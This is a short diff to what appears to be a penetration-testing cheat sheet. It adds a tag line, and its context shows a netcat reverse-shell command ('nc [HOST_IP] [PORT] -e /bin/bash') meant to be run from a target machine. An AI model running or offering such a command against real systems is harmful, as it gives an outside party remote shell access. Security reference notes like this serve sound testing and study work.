@@ -41,3 +41,7 @@ From target machine:
 ```bash
 $ nc [HOST_IP] [PORT] -e /bin/bash
 ```
+
+# Tags
+
+#cheat-sheet 
